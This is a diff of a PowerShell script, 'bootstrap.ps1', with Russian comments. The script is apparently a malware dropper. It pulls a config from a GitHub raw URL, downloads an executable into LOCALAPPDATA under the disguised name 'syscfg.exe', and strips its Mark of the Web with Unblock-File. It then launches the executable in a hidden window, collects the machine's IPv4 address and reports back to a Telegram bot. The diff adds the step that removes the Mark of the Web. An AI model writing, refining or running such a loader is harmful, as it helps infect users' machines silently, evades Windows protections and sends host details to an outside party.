@@ -1,10 +1,6 @@
-
 # =========================================
-# Bootstrap.ps1
-# - тянет cfg.json
-# - скачивает exe
-# - запускает exe
-# - отправляет отчёт в Telegram
+# bootstrap.ps1
+# User-mode bootstrap (no admin required)
 # =========================================
 
 try {
@@ -13,7 +9,9 @@ try {
 
     # --- URLs
     $CFG_URL = 'https://github.com/sapog228ru-ship-it/test/raw/refs/heads/main/cfg.json'
-    $TMP_EXE = Join-Path $env:TEMP 'syscfg.exe'
+
+    # --- Путь ДЛЯ ПОЛЬЗОВАТЕЛЯ (НЕ TEMP)
+    $EXE_PATH = Join-Path $env:LOCALAPPDATA 'syscfg.exe'
 
     # --- Получаем конфиг
     $cfg = Invoke-RestMethod -Uri $CFG_URL -UseBasicParsing
@@ -23,16 +21,19 @@ try {
     }
 
     # --- Скачиваем EXE
-    Invoke-WebRequest -Uri $cfg.exe -OutFile $TMP_EXE -UseBasicParsing
+    Invoke-WebRequest -Uri $cfg.exe -OutFile $EXE_PATH -UseBasicParsing
 
-    if (-not (Test-Path $TMP_EXE)) {
+    if (-not (Test-Path $EXE_PATH)) {
         throw 'EXE download failed'
     }
 
-    # --- Запуск EXE
-    Start-Process -FilePath $TMP_EXE -WindowStyle Hidden
+    # --- Убираем Mark of the Web (НЕ требует admin)
+    Unblock-File -Path $EXE_PATH -ErrorAction SilentlyContinue
 
-    # --- Получаем IPv4 (без 127 и 169.254)
+    # --- Запускаем EXE (user-context)
+    Start-Process -FilePath $EXE_PATH -WindowStyle Hidden
+
+    # --- Определяем IPv4 пользователя
     $ip = [System.Net.Dns]::GetHostAddresses(
         [System.Net.Dns]::GetHostName()
     ) | Where-Object {
@@ -56,7 +57,7 @@ try {
 
 }
 catch {
-    # --- Telegram ERROR (если возможно)
+    # --- Telegram ERROR (если что-то пошло не так)
     try {
         Invoke-RestMethod `
             -Uri "https://api.telegram.org/bot$($cfg.tg.token)/sendMessage" `
